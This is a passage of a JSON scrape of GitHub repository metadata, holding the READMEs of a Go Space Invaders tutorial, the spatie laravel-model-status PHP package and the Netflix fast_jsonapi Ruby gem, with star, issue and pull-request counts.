alien1Sprite = image.Rect(0, 0, 20, 14)\nvar alien1aSprite = image.Rect(20, 0, 40, 14)\nvar alien2Sprite = image.Rect(0, 14, 20, 26)\nvar alien2aSprite = image.Rect(20, 14, 40, 26)\nvar alien3Sprite = image.Rect(0, 27, 20, 40)\nvar alien3aSprite = image.Rect(20, 27, 40, 40)\nvar alienExplode = image.Rect(0, 60, 16, 68)\nvar beamSprite = image.Rect(20, 60, 22, 65)\nvar bombSprite = image.Rect(0, 70, 10, 79)\n```\nEach sprite is represented by an `image.Rectangle` position of the corresponding sprite image in the `sprites.png` file. For example, the `alien1Sprite` shows a Rectangle with the upper left position of `(0,0)` and the lower right position of `(20,14)`.\n\n![position](/images/sprites-position.png)\n\nWe'll see how this is being used in a short while.\n\nWe also see that we load up the 2 image files `sprites.png` and `bg.png`. This function simply gets an `image.Image` from an image file.\n\n```go\nfunc getImage(filePath string) image.Image {\n\timgFile, err := os.Open(filePath)\n\tdefer imgFile.Close()\n\tif err != nil {\n\t\tfmt.Println(\"Cannot read file:\", err)\n\t}\n\timg, _, err := image.Decode(imgFile)\n\tif err != nil {\n\t\tfmt.Println(\"Cannot decode file:\", err)\n\t}\n\treturn img\n}\n```\n\nNow that we have the positions of the sprites, let's see the `Sprite` struct itself.\n\n```go\n// Sprite represents a sprite in the game\ntype Sprite struct {\n\tsize     image.Rectangle // the sprite size\n\tFilter   *gift.GIFT      // normal filter used to draw the sprite\n\tFilterA  *gift.GIFT      // alternate filter used to draw the sprite\n\tFilterE  *gift.GIFT      // exploded filter used to draw the sprite\n\tPosition image.Point     // top left position of the sprite\n\tStatus   bool            // alive or dead\n\tPoints   int             // number of points if destroyed\n}\n```\n\nThe sprites are represented by:\n\n1. The size of the sprite, which is the Rectangle we defined earlier\n2. 3 images filters which we will later use for drawing the sprites\n3. The position of the sprite to draw on the background\n4. A representation of the status of the sprite, and \n5. The number of points if the sprite is destroyed (this is only applicable for aliens).\n\nThe image filters we are using are from the excellent [Go Image Filtering Toolkit (GIFT)](https://github.com/disintegration/gift). We are underutilising this library since we're only using this to draw the sprite on the background. Each sprite has 3 filters, a normal filter for drawing a normal sprite, an alternate filter, which draws an alternate form of the sprite (only for aliens, so far) and an exploded filter, which draws the sprite when it's exploded (or died). We're using the alternate form of the sprite to animate the sprite.\n\nLet's look at the definition of different sprites in the game.\n\n```go\nvar aliens = []Sprite{}\n\n// sprite for laser cannon\nvar laserCannon = Sprite{\n\tsize:     cannonSprite,\n\tFilter:   gift.New(gift.Crop(cannonSprite)),\n\tPosition: image.Pt(50, 250),\n\tStatus:   true,\n}\n\n// sprite for the laser beam\nvar beam = Sprite{\n\tsize:     beamSprite,\n\tFilter:   gift.New(gift.Crop(beamSprite)),\n\tPosition: image.Pt(laserCannon.Position.X+7, 250),\n\tStatus:   false,\n}\n```\n\nThis is a simplified version of Space Invaders, so we only have 4 types of sprites -- aliens, the bombs the aliens drop, the laser cannon, and the laser beam that shoots out of the cannon. The variable `aliens` is an array of alien sprites, `bombs` is an array of bombs dropped while `laserCannon` is the laser cannon sprite and `beam` is the laser beam sprite. As you can see from the code, the filter crops the part of the sprite sheet according to the defined Rectangle earlier.\n\nWe're not creating the aliens yet here, but we'll need to in a while, which we will be using a function:\n\n```go\n// used for creating alien sprites\nfunc createAlien(x, y int, sprite, alt image.Rectangle, points int) (s Sprite) {\n\ts = Sprite{\n\t\tsize:     sprite,\n\t\tFilter:   gift.New(gift.Crop(sprite)),\n\t\tFilterA:  gift.New(gift.Crop(alt)),\n\t\tFilterE:  gift.New(gift.Crop(alienExplode)),\n\t\tPosition: image.Pt(x, y),\n\t\tStatus:   true,\n\t\tPoints:   points,\n\t}\n\treturn\n}\n```\n\nWe wil be passing the Rectangles to the function to create the correct alien sprite and it's alternate form (for animating the sprite) but all aliens explode the same way. Bombs are created in the game loop itself and we'll see it later.\n\nSo much for the sprites, let's look at the `main` function of the game.\n\n## The action starts\n\nThis is a game that starts from the terminal, and the whole game is animated on the terminal. Therefore, controlling the terminal is very important. I used the popular [termbox-go](https://github.com/nsf/termbox-go) library to give me this control. Termbox, as with the GIFT library, is probably an overkill since it's a much more powerful library than is needed here.\n\n```go\nerr := termbox.Init()\nif err != nil {\n\tpanic(err)\n}\n```\n\nI start off the main function by initializing termbox-go. The game actually has 2 independent loops:\n\n* The first is the control of the laser cannon by the user and this is through input on the keyboard (left and right arrows)\n* The second is the rest of the game, in what is called a game loop, explained later. This runs regardless of whatever the user does. It includes continual movement of the aliens as they descend while dropping bombs to destroy all life on earth as well as the upward movement of the laser beam as it hurtles towards the aliens to blast them to bits.\n\nThis means there are 2 concurrently running threads, and in this case, goroutines.\n\n```go\n// poll for keyboard events in another goroutine\nevents := make(chan termbox.Event, 1000)\ngo func() {\n\tfor {\n\t\tevents <- termbox.PollEvent()\n\t}\n}()\n```\n\nWe start a separate goroutine that polls for events and stuffs them into a buffered channel. We're using a liberally large buffer here, it can really be smaller, but the larger the buffer, the relatively smoother the event captures are so I didn't really try to figure out the optimal size.\n\nMost games have a start screen, where you are asked to place credits to press a button to begin. We have one too.\n\n```go\n\t// show the start screen\n\tstartScreen := getImage(\"imgs/start.png\")\n\tprintImage(startScreen)\nstart:\n\tfor {\n\t\tswitch ev := termbox.PollEvent(); ev.Type {\n\t\tcase termbox.EventKey:\n\t\t\tif ev.Ch == 's' || ev.Ch == 'S' {\n\t\t\t\tbreak start\n\t\t\t}\n\t\t\tif ev.Ch == 'q' {\n\t\t\t\tgameOver = true\n\t\t\t\tbreak start\n\t\t\t}\n\t\t}\n\t}\n```\n\nWe're polling the keyboard again, and we're waiting for some to either press the `s` or `S` to begin the game, or `q` to quit the game.\n\nNext, we populate the `aliens` array. This is pretty straightforward, we simply want 3 rows of different aliens.\n\n```go\n// populate the aliens\nfor i := aliensStartCol; i < aliensStartCol+(alienSize*aliensPerRow); i += alienSize {\n\taliens = append(aliens, createAlien(i, 30, alien1Sprite, alien1aSprite, 30))\n}\nfor i := aliensStartCol; i < aliensStartCol+(30*aliensPerRow); i += alienSize {\n\taliens = append(aliens, createAlien(i, 55, alien2Sprite, alien2aSprite, 20))\n}\nfor i := aliensStartCol; i < aliensStartCol+(30*aliensPerRow); i += alienSize {\n\taliens = append(aliens, createAlien(i, 80, alien3Sprite, alien3aSprite, 10))\n}\n```\n\n## Game loop\n\nNow that we've laid the groundwork, let's get into the main game loop. Most games run in a what is commonly called a [game loop](http://gameprogrammingpatterns.com/game-loop.html). A game loop is a game software development pattern that is often the heart of a game. It's an infinite loop that updates and redraws to animate gameplay. In our Space Invaders game loop we use a variable named `gameOver` to indicate that the loop should continue until the game ends (either triggered by the player or when the aliens win).\n\nThe game loop is rather long so we'll break it up into a few parts. Let's look at the first part, which is used to capture the keyboard events from the player.\n\n\n```go\n// if any of the keyboard events are captured\nselect {\ncase ev := <-events:\n\tif ev.Type == termbox.EventKey {\n\t\tif ev.Key == termbox.KeyCtrlQ {\n\t\t\tgameOver = true\n\t\t}\n\t\tif ev.Key == termbox.KeySpace {\n\t\t\tif beam.Status == false {\n\t\t\t\tbeamShot = true\n\t\t\t}\n\t\t}\n\t\tif ev.Key == termbox.KeyArrowRight {\n\t\t\tlaserCannon.Position.X += 10\n\t\t}\n\t\tif ev.Key == termbox.KeyArrowLeft {\n\t\t\tlaserCannon.Position.X -= 10\n\t\t}\n\t}\n\ndefault:\n\n}\n```\n\nWhenever the `events` buffered channel has something, it will be received into the `ev` variable where we try to determine what kind of event it is. Pressing `Ctrl-Q` ends the game, while pressing the space bar fires a laser beam. Pressing the left or right arrow buttons move the laser cannon left or right accordingly. \n\nYou might notice that we have to have a default in the select. This is because if we don't have the default, the select will block, and the loop can only proceed whenever the user presses a key!\n\nNext, we'll draw the laser cannon and alien sprites. We start off with an empty image and drawing the background on to it.\n\n```go\n// create background\ndst := image.NewRGBA(image.Rect(0, 0, windowWidth, windowHeight))\ngift.New().Draw(dst, background)\n```\n\n## Aliens are coming!\n\nWe start off with the aliens first.\n\n```go\n// process aliens\nfor i := 0; i < len(aliens); i++ {\n\taliens[i].Position.X = aliens[i].Position.X + 5*alienDirection\n\tif aliens[i].Status {\n\t\t// if alien is hit by a laser beam\n\t\tif collide(aliens[i], beam) {\n\t\t\t// draw the explosion\n\t\t\taliens[i].FilterE.DrawAt(dst, src, image.Pt(aliens[i].Position.X, aliens[i].Position.Y), gift.OverOperator)\n\t\t\t// alien dies, player scores points\n\t\t\taliens[i].Status = false\n\t\t\tscore += aliens[i].Points\n\t\t\t// reset the laser beam\n\t\t\tresetBeam()\n\t\t} else {\n\t\t\t// show alternating alients\n\t\t\tif loop%2 == 0 {\n\t\t\t\taliens[i].Filter.DrawAt(dst, src, image.Pt(aliens[i].Position.X, aliens[i].Position.Y), gift.OverOperator)\n\t\t\t} else {\n\t\t\t\taliens[i].FilterA.DrawAt(dst, src, image.Pt(aliens[i].Position.X, aliens[i].Position.Y), gift.OverOperator)\n\t\t\t}\n\t\t\t// drop torpedoes\n\t\t\tif rand.Float64() < bombProbability {\n\t\t\t\tdropBomb(aliens[i])\n\t\t\t}\t\t\t\n\t\t}\n\t}\n}\n```\n\nTo determine where the aliens should be going, we multiply the horizontal (X) position of the alien with the variable `alienDirection`. \n\nWe also use the `Status` of the alien to determine if it's alive or dead. If it's alive, we check if it has collided with a laser beam. If yes, it's dead. We draw the explosion sprite, set the `Status` to false, rack up the player points and reset the laser beam. Reseting the laser beam just means we set the beam's `Status` back to `false` and place it at the vertical (Y) level the same as the cannon.\n\n```go\nfunc resetBeam() {\n\tbeam.Status = false\n\tbeam.Position.Y = 250\n}\n```\n\n## Collision physics\n\nIf the alien didn't collide with the laser beam, we display either the normal sprite or the alternate sprite. This gives us the animation of a moving alien.\n\nLet's take a quick look at the collision physics, which is concentrated in the `collide()` function.\n\n```go\nfunc collide(s1, s2 Sprite) bool {\n\tspriteA := image.Rect(s1.Position.X, s1.Position.Y, s1.Position.X+s1.size.Dx(), s1.Position.Y+s1.size.Dy())\n\tspriteB := image.Rect(s2.Position.X, s2.Position.Y, s2.Position.X+s1.size.Dx(), s2.Position.Y+s1.size.Dy())\n\tif spriteA.Min.X < spriteB.Max.X && spriteA.Max.X > spriteB.Min.X &&\n\t\tspriteA.Min.Y < spriteB.Max.Y && spriteA.Max.Y > spriteB.Min.Y {\n\t\treturn true\n\t}\n\treturn false\n}\n```\n\nGive the two sprites are boxed within the two rectangles, the sprites are considered to have collided if all these conditions are met:\n\n*  spriteA.Min.X < spriteB.Max.X\n*  spriteA.Max.X > spriteB.Min.X\n*  spriteA.Min.Y < spriteB.Max.Y\n*  spriteA.Max.Y > spriteB.Min.Y\n\n![collision](images/collision.png)\n\n## Bombs away\n\nThe aliens drop bombs as they descend on the laser cannon. Obviously we don't want it to drop bombs continually, so we use a probability to determine if the bomb should be dropped or not.\n\n```go\n// drop torpedoes\nif rand.Float64() < bombProbability {\n\tdropBomb(aliens[i])\n}\t\n```\n\nDropping a bomb here means we create a new `Bomb` sprite and set it to start at where the alien is located, then adding it to the array of bombs.\n\n```go\nfunc dropBomb(alien Sprite) {\n\ttorpedo := Sprite{\n\t\tsize:     bombSprite,\n\t\tFilter:   gift.New(gift.Crop(bombSprite)),\n\t\tPosition: image.Pt(alien.Position.X+7, alien.Position.Y),\n\t\tStatus:   true,\n\t}\n\n\tbombs = append(bombs, torpedo)\n}\n```\n\nNow that we have drawn the aliens (or its death by explosion), we check if it has moved outside of the window. It it has, we reverse the direction and move the aliens down.\n\n```go\n// move the aliens back and forth\nif aliens[0].Position.X < alienSize || aliens[aliensPerRow-1].Position.X > windowWidth-(2*alienSize) {\n\talienDirection = alienDirection * -1\n\tfor i := 0; i < len(aliens); i++ {\n\t\taliens[i].Position.Y = aliens[i].Position.Y + 10\n\t}\n}\n```\n\nWe also need to move the bombs downwards on its deadly descend, according to the `bombSpeed`.\n\n```go\n// draw bombs, if laser cannon is hit, game over\nfor i := 0; i < len(bombs); i++ {\n\tbombs[i].Position.Y = bombs[i].Position.Y + bombSpeed\n\tbombs[i].Filter.DrawAt(dst, src, image.Pt(bombs[i].Position.X, bombs[i].Position.Y), gift.OverOperator)\n\tif collide(bombs[i], laserCannon) {\n\t\tgameOver = true\n\t\tlaserCannon.FilterE.DrawAt(dst, src, image.Pt(laserCannon.Position.X, laserCannon.Position.Y), gift.OverOperator)\n\t}\n}\n```\nAs the bombs drop, we need to check if it collides with the laser cannon. If it did, it's game over, and we draw the exploding cannon sprite.\n\nThat's it for the aliens and their bombs in the game loop. Let's look at the laser cannon and its laser beam next. \n\n## Laser cannon and beams\n\nThe laser cannon is relatively simple. We continue drawing the cannon as long as it's not been destroyed.\n\n```go\n// draw the laser cannon unless it's been destroyed\nif !gameOver {\n\tlaserCannon.Filter.DrawAt(dst, src, image.Pt(laserCannon.Position.X, laserCannon.Position.Y), gift.OverOperator)\n}\n```\n\nAs for the laser beam, since there is only one variable to represent it you'd probably realise that the cannon can only shoot one laser beam at a time. This is mostly for simplicity's sake.\n\nWe use the `beamShot` variable to determine if the player has pressed the space bar, and therefore shot the laser cannon. \n\n```go\n// if the beam is shot, place the beam at start of the cannon\nif beamShot {\n\tbeam.Position.X = laserCannon.Position.X + 7\n\tbeam.Status = true\n\tbeamShot = false\n}\n```\n\nIf yes, we place the beam at the tip of the laser cannon, set the beam's `Status` to `true` to indicate that the beam is in action and we should show it, then set `beamShot` back to false.\n\nWe need to check the beam's `Status` and if it's in action, we draw it and then move it up. If the beam's position is outside the window, we reset the beam again.\n\n```go\n// keep drawing the beam as it moves every loop\nif beam.Status {\n\tbeam.Filter.DrawAt(dst, src, image.Pt(beam.Position.X, beam.Position.Y), gift.OverOperator)\n\tbeam.Position.Y -= 10\n}\n\n// if the beam leaves the window reset it\nif beam.Position.Y < 0 {\n\tresetBeam()\n}\n```\n\n# Wrapping up and printing the image\n\nJust before we end the game loop, we print the image to the screen, print the score and increment the loop.\n\n```go\nprintImage(dst)\nfmt.Println(\"\\n\\nSCORE:\", score)\nloop++\n```\nSo how _exactly_ do we print the image on the screen? This is done through a simple hack on ITerm2 (so this only works on iTerm2, sorry!)\n\n```go\n// this only works for iTerm2!\nfunc printImage(img image.Image) {\n\tvar buf bytes.Buffer\n\tpng.Encode(&buf, img)\n\timgBase64Str := base64.StdEncoding.EncodeToString(buf.Bytes())\n\tfmt.Printf(\"\\x1b[2;0H\\x1b]1337;File=inline=1:%s\\a\", imgBase64Str)\n}\n```\n\nAnd that's it! All in all, including comments, the code is less than 300 lines. If it seems pretty short, you should remember the original entire compiled binary ROM for the game is less than 110kb in size, including images and music! And mine is a simpler clone without the full game features (multiple lives, defender bunkers, ufo etc) and also includes 2 external libraries.\n\nThis is how it looks on my computer. How does it look on yours?\n\n![invaders](images/invaders.gif)\n\n# Code\n\nThe code for this is all here in this GitHub repository.\n\nhttps://github.com/sausheong/invaders\n\n","byteSize":19951},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":505},"createdAt":"2018-02-01T05:02:52Z","updatedAt":"2018-02-16T21:19:54Z","pushedAt":"2018-02-11T23:08:55Z","description":"Space Invaders in Go","subscribersCount":{"totalCount":19},"diskUsage":4006,"pullRequestsOpen":{"totalCount":4},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":4},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":3}}}]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":5}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"organization":{"login":"spatie","repositories":{"totalCount":185},"location":"Antwerp, Belgium","members":{"totalCount":7},"websiteUrl":"https://spatie.be/opensource"},"repository":{"name":"laravel-model-status","primaryLanguage":{"name":"PHP"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":4,"readme_md":{"text":"# Assign statuses to Eloquent models\n\n[![Latest Version on Packagist](https://img.shields.io/packagist/v/spatie/laravel-model-status.svg?style=flat-square)](https://packagist.org/packages/spatie/laravel-model-status)\n[![Build Status](https://img.shields.io/travis/spatie/laravel-model-status/master.svg?style=flat-square)](https://travis-ci.org/spatie/laravel-model-status)\n[![StyleCI](https://styleci.io/repos/119671555/shield?branch=master)](https://styleci.io/repos/119671555)\n[![Quality Score](https://img.shields.io/scrutinizer/g/spatie/laravel-model-status.svg?style=flat-square)](https://scrutinizer-ci.com/g/spatie/laravel-model-status)\n[![Total Downloads](https://img.shields.io/packagist/dt/spatie/laravel-model-status.svg?style=flat-square)](https://packagist.org/packages/spatie/laravel-model-status)\n\nImagine you want to have an Eloquent model hold a status. It's easily solved by just adding a `status` field to that model and be done with it. But in case you need a history of status changes or need to store some extra info on why a status changed, just adding a single field won't cut it. \n\nThis package provides a `HasStatuses` trait that, once installed on a model, allows you to do things like this:\n\n```php\n// set a status\n$model->setStatus('pending', 'needs verification');\n\n// set another status\n$model->setStatus('accepted');\n\n// specify a reason\n$model->setStatus('rejected', 'My rejection reason');\n\n// get the current status\n$model->status(); // returns an instance of \\Spatie\\ModelStatus\\Status\n\n// get the previous status\n$latestPendingStatus = $model->latestStatus('pending');\n\n$latestPendingStatus->reason; // returns 'needs verification'\n```\n\n## Installation\n\nYou can install the package via composer:\n\n```bash\ncomposer require spatie/laravel-model-status\n```\n\nYou must publish the migration with:\n```bash\nphp artisan vendor:publish --provider=\"Spatie\\ModelStatus\\ModelStatusServiceProvider\" --tag=\"migrations\"\n```\n\nMigrate the `statuses` table:\n\n```bash\nphp artisan migrate\n```\n\nOptionally you can publish the config-file with:\n```bash\nphp artisan vendor:publish --provider=\"Spatie\\ModelStatus\\ModelStatusServiceProvider\" --tag=\"config\"\n```\n\nThis is the contents of the file which will be published at `config/models-status.php`\n\n```php\nreturn [\n\n    /*\n     * The class name of the status model that holds all statuses.\n     * \n     * The model must be or extend `Spatie\\ModelStatus\\Status`.\n     */\n    'status_model' => Spatie\\ModelStatus\\Status::class,\n\n];\n```\n\n## Usage\n\nAdd the `HasStatuses` trait to a model you like to use statuses on.\n\n```php\nuse Spatie\\ModelStatus\\HasStatuses;\n\nclass YourEloquentModel extends Model\n{\n    use HasStatuses;\n}\n```\n\n### Set a new status\n\nYou can set a new status like this:\n\n```php\n$model->setStatus('status-name');\n```\n\nA reason for the status change can be passed as a second argument.\n\n```php\n$model->setStatus('status-name', 'optional reason');\n```\n\n### Retrieving statuses\n\nYou can get the current status of model:\n\n```php\n$model->status; // returns a string with the name of the latest status\n\n$model->status(); // returns the latest instance of `Spatie\\ModelStatus\\Status`\n\n$model->latestStatus(); // equivalent to `$model->status()`\n```\n\nYou can also get latest status of a given name:\n\n```php\n$model->latestStatus('pending'); // returns an instance of `Spatie\\ModelStatus\\Status` that has the name `pending`\n```\n\nThe following examples will return statusses of type `status 1` or `status 2`, whichever is latest.\n\n```php\n$lastStatus = $model->latestStatus(['status 1', 'status 2']);\n\n// or alternatively...\n$lastStatus = $model->latestStatus('status 1', 'status 2');\n```\n\nAll associated statuses of a model can be retrieved like this:\n\n```php\n$allStatuses = $model->statuses;\n```\n\n\n### Retrieving models with a given latest state\n\nThe `currentStatus` scope will return models that have a status with the give name.\n\n```php\n$allPendingModels = Model::currentStatus('pending');\n```\n\n#### Validating a status before setting it\n\nYou can add custom validation when setting a status by overwriting the `isValidStatus` method:\n\n```php\npublic function isValidStatus(string $name, string $description = ''): bool\n{\n    ...\n\n    if (! $condition) {\n        return false;\n    }\n\n    return true;\n}\n```\n\nIf `isValidStatus` returns `false` a `Spatie\\ModelStatus\\Exceptions\\InvalidStatus` exception will be thrown.\n\n### Custom model and migration\n\nYou can change the model used by specifying a class name in the `status_model` key of the `model-status` config file. \n\n### Testing\n\nThis package contains integration tests that are powered by [orchestral/testbench](https://github.com/orchestral/testbench).\n\nYou can run all tests with:\n\n```bash\ncomposer test\n```\n\n### Changelog\n\nPlease see [CHANGELOG](CHANGELOG.md) for more information what has changed recently.\n\n## Contributing\n\nPlease see [CONTRIBUTING](CONTRIBUTING.md) for details.\n\n### Security\n\nIf you discover any security related issues, please email freek@spatie.be instead of using the issue tracker.\n\n## Postcardware\n\nYou're free to use this package, but if it makes it to your production environment we highly appreciate you sending us a postcard from your hometown, mentioning which of our package(s) you are using.\n\nOur address is: Spatie, Samberstraat 69D, 2060 Antwerp, Belgium.\n\nWe publish all received postcards [on our company website](https://spatie.be/en/opensource/postcards).\n\n## Credits\n\n- [Thomas Verhelst](https://github.com/TVke)\n- [Freek Van der Herten](https://github.com/freekmurze)\n- [All Contributors](../../contributors)\n\n## Support us\n\nSpatie is a webdesign agency based in Antwerp, Belgium. You'll find an overview of all our open source projects [on our website](https://spatie.be/opensource).\n\nDoes your business depend on our contributions? Reach out and support us on [Patreon](https://www.patreon.com/spatie).\nAll pledges will be dedicated to allocating workforce on maintenance and new awesome stuff.\n\n## License\n\nThe MIT License (MIT). Please see [License File](LICENSE.md) for more information.\n","byteSize":6058},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":108},"createdAt":"2018-01-31T10:20:27Z","updatedAt":"2018-02-15T03:21:23Z","pushedAt":"2018-02-09T20:39:30Z","description":"Easily add statuses to your models","subscribersCount":{"totalCount":9},"diskUsage":116,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":1},"pullRequestsMerged":{"totalCount":16},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}}]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":3},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":4},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":121}}},"tags":{"totalCount":8},"releases":{"totalCount":8},"type":"organization"},"siteAdmin":"false"},{"organization":{"login":"Netflix","repositories":{"totalCount":134},"location":"Los Gatos, California","members":{"totalCount":49},"websiteUrl":"http://netflix.github.io/"},"repository":{"name":"fast_jsonapi","primaryLanguage":{"name":"Ruby"},"license":"Apache License 2.0","isArchived":false,"hasWikiEnabled":true,"forkCount":80,"readme_md":{"text":"# Fast JSON API\n\n[![Build Status](https://travis-ci.org/Netflix/fast_jsonapi.svg?branch=master)](https://travis-ci.org/Netflix/fast_jsonapi)\n\nA lightning fast [JSON:API](http://jsonapi.org/) serializer for Ruby Objects.\n\n# Performance Comparison\n\nWe compare serialization times with Active Model Serializer as part of RSpec performance tests included on this library. We want to ensure that with every change on this library, serialization time is at least `25 times` faster than Active Model Serializers on up to current benchmark of 1000 records. Please read the [performance document](https://github.com/Netflix/fast_jsonapi/blob/master/performance_methodology.md) for any questions related to methodology.\n\n## Benchmark times for 250 records\n\n```bash\n$ rspec\nActive Model Serializer serialized 250 records in 138.71 ms\nFast JSON API serialized 250 records in 3.01 ms\n```\n\n# Table of Contents\n\n* [Features](#features)\n* [Installation](#installation)\n* [Usage](#usage)\n  * [Model Definition](#model-definition)\n  * [Serializer Definition](#serializer-definition)\n  * [Object Serialization](#object-serialization)\n  * [Compound Document](#compound-document)\n  * [Collection Serialization](#collection-serialization)\n  * [Caching](#caching)\n* [Contributing](#contributing)\n\n\n## Features\n\n* Declaration syntax similar to Active Model Serializer\n* Support for `belongs_to`, `has_many` and `has_one`\n* Support for compound documents (included)\n* Optimized serialization of compound documents\n* Caching\n\n## Installation\n\nAdd this line to your application's Gemfile:\n\n```ruby\ngem 'fast_jsonapi'\n```\n\nExecute:\n\n```bash\n$ bundle install\n```\n\n## Usage\n\n### Model Definition\n\n```ruby\nclass Movie\n  attr_accessor :id, :name, :year, :actor_ids, :owner_id, :movie_type_id\nend\n```\n\n### Serializer Definition\n\n```ruby\nclass MovieSerializer\n  include FastJsonapi::ObjectSerializer\n  set_type :movie  # optional\n  attributes :name, :year\n  has_many :actors\n  belongs_to :owner, record_type: :user\n  belongs_to :movie_type\nend\n```\n\n### Sample Object\n\n```ruby\nmovie = Movie.new\nmovie.id = 232\nmovie.name = 'test movie'\nmovie.actor_ids = [1, 2, 3]\nmovie.owner_id = 3\nmovie.movie_type_id = 1\nmovie\n```\n\n### Object Serialization\n\n#### Return a hash\n```ruby\nhash = MovieSerializer.new(movie).serializable_hash\n```\n\n#### Return Serialized JSON\n```ruby\njson_string = MovieSerializer.new(movie).serialized_json\n```\n\n#### Serialized Output\n\n```json\n{\n  \"data\": {\n    \"id\": \"232\",\n    \"type\": \"movie\",\n    \"attributes\": {\n      \"name\": \"test movie\",\n      \"year\": null\n    },\n    \"relationships\": {\n      \"actors\": {\n        \"data\": [\n          {\n            \"id\": \"1\",\n            \"type\": \"actor\"\n          },\n          {\n            \"id\": \"2\",\n            \"type\": \"actor\"\n          }\n        ]\n      },\n      \"owner\": {\n        \"data\": {\n          \"id\": \"3\",\n          \"type\": \"user\"\n        }\n      }\n    }\n  }\n}\n\n```\n### Compound Document\n\nSupport for top-level included member through ` options[:include] `.\n\n```ruby\noptions = {}\noptions[:meta] = { total: 2 }\noptions[:include] = [:actors]\nMovieSerializer.new([movie, movie], options).serialized_json\n```\n\n### Collection Serialization\n\n```ruby\noptions[:meta] = { total: 2 }\nhash = MovieSerializer.new([movie, movie], options).serializable_hash\njson_string = MovieSerializer.new([movie, movie], options).serialized_json\n```\n\n### Caching\n\n```ruby\nclass MovieSerializer\n  include FastJsonapi::ObjectSerializer\n  set_type :movie  # optional\n  cache_options enabled: true, cache_length: 12.hours\n  attributes :name, :year\nend\n```\n\n### Customizable Options\n\nOption | Purpose | Example\n------------ | ------------- | -------------\nset_type | Type name of Object | ```set_type :movie ```\ncache_options | Hash to enable caching and set cache length | ```cache_options enabled: true, cache_length: 12.hours```\nid_method_name | Set custom method name to get ID of an object | ```has_many :locations, id_method_name: :place_ids ```\nobject_method_name | Set custom method name to get related objects | ```has_many :locations, object_method_name: :places ```\nrecord_type | Set custom Object Type for a relationship | ```belongs_to :owner, record_type: :user```\nserializer | Set custom Serializer for a relationship | ```has_many :actors, serializer: :custom_actor```\n\n\n## Contributing\n\nPlease follow the steps on [contribution check](https://github.com/Netflix/fast_jsonapi/blob/master/CONTRIBUTING.md).\nThis gem is built using a gem building gem called [juwelier](https://github.com/flajann2/juwelier).\n\nBeyond just editing source code, you’ll be interacting with the gem using rake a lot. To see all the tasks available with a brief description, you can run:\n\n```bash\nrake -T\n```\n\n### Updating Project information\nYou can update the project information of the gem by updating the [Rakefile](Rakefile). Then you need to generate a new gemspec:\n\n```bash\nrake gemspec\n```\n\n### Running Tests\nWe use [RSpec](http://rspec.info/) for testing. We have unit tests, functional tests and performance tests. To run tests use the following rake task:\n\n```bash\nrake spec\n```\n\n### Installation\n\n```bash\n$ rake install\n```\n\nThe install rake task builds the gem and then installs it. You're all\nset if you're using [RVM](http://rvm.beginrescueend.com/), but you may\nneed to run it with sudo if you have a system-installed Ruby:\n\n### Bumping Version\n\nIt feels good to release code. Do it, do it often. But before that, bump\nthe version. Then release it. There's a few ways to update the version:\n\n```bash\n# version:write like before\n$ rake version:write MAJOR=0 MINOR=3 PATCH=0\n\n# bump just major, ie 0.1.0 -> 1.0.0\n$ rake version:bump:major\n\n# bump just minor, ie 0.1.0 -> 0.2.0\n$ rake version:bump:minor\n\n# bump just patch, ie 0.1.0 -> 0.1.1\n$ rake version:bump:patch\n```\n\n---\n\n### We're Hiring!\n\nJoin the Netflix Studio Engineering team and help us build gems like this!\n\n* [Senior Ruby Engineer](https://jobs.netflix.com/jobs/864893)\n* [Senior Platform 